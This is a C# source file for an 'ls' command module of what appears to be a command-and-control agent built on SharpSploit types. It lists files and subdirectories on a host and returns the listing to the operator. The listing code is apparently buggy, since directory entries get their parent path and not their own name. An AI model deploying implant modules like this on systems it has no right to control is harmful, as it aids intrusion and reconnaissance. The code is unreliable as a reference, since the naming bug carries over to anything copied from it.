using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ListirectoryCommand : AgentCommand
    {
        public override string Name => "ls";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            var results = new SharpSploitResultList<ListDirectoryResult>();

            string path;
            if (task.SplittedArgs.Length == 0)
            {
                path = Directory.GetCurrentDirectory();
            }
            else
            {
                path = task.SplittedArgs[0];
            }

            var directories = Directory.GetDirectories(path);
            foreach (var dir in directories)
            {
                var dirInfo = new DirectoryInfo(dir);
                results.Add(new ListDirectoryResult()
                {
                    Name = Path.GetDirectoryName(dirInfo.FullName),
                    Length = 0
                });
            }

            var files = Directory.GetFiles(path);
            foreach(var file in files)
            {
                var fileInfo = new FileInfo(file);
                results.Add(new ListDirectoryResult()
                {
                    Name = Path.GetFileName(fileInfo.FullName),
                    Length = fileInfo.Length
                });
            }

            result.Result = results.ToString();
        }

        public sealed class ListDirectoryResult : SharpSploitResult
        {
            public string Name { get; set; }
            public long Length { get; set; }

            protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>()
            {
                new SharpSploitResultProperty { Name = nameof(Name), Value = Name },
                new SharpSploitResultProperty { Name = nameof(Length), Value = Length }
            };
        }
    }
}
